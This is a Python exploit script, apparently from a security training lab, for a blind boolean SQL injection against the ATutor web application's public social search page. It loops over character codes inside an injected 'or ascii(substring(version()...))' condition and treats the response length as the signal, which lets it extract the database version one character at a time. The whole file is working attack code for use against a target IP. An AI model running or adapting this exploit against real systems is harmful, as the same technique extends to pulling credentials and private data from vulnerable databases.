import requests 
import sys


def searchFriends_sqli(ip, inj_str):
	for j in range(32,126):
	# now we update thesqli
		target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str.replace("[CHAR]", str(j)))
		#print(target)
		r = requests.get(target)
		content_length = int(r.headers['Content-Length'])
		if (content_length > 20):
			return j
	return None


def	main():
	if len(sys.argv) != 2:
		print ("(+) usage: %s <target>" % sys.argv[0])
		print ('(+) eg: %s 192.168.121.103' % sys.argv[0])
		sys.exit(-1)


	ip = sys.argv[1]
	print ("(+) Retrieving database version....")
	# 19 is length of the version() string. This can
	# be dynamically stolen from the database as well!

	for i in range(1, 20):
		injection_string = "test')/**/or/**/(ascii(substring((select/**/version()),%d,1)))=[CHAR]%%23" % i
		#print(injection_string)
		extracted_char = chr(searchFriends_sqli(ip, injection_string))
		sys.stdout.write(extracted_char)
		sys.stdout.flush()
	print ("\n(+) done!")


if __name__ == "__main__":
	main()